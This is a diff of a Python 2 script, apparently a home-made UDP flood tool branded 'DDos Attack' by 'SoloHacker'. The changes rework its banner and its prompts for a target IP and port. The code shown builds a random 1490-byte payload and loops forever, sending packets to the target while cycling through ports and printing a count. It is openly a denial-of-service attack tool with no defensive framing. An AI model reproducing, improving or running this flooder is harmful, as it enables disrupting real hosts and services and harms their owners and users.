@@ -1,6 +1,4 @@
   
-#!/usr/bin/python
-# -*- coding: ascii -*-
 import sys
 import os
 import time
@@ -22,19 +20,17 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-
-print "Created By Solo"
 print
-   ____            _             _   _                  _                         __  
+print "Author   : SoloHacker"
+print "  ____            _             _   _                  _                         __  
  / ___|    ___   | |   ___     | | | |   __ _    ___  | | __   ___   _ __     _  \ \ 
  \___ \   / _ \  | |  / _ \    | |_| |  / _` |  / __| | |/ /  / _ \ | '__|   (_)  | |
   ___) | | (_) | | | | (_) |   |  _  | | (_| | | (__  |   <  |  __/ | |       _   | |
  |____/   \___/  |_|  \___/    |_| |_|  \__,_|  \___| |_|\_\  \___| |_|      (_)  | |
-                                                                                 /_/ 
+                                                                                 /_/ "
 print
-
-ip = raw_input("Ip")
-port = input  ("Port")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -55,4 +51,4 @@ while True:
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
-       port = 5
+       port = 1
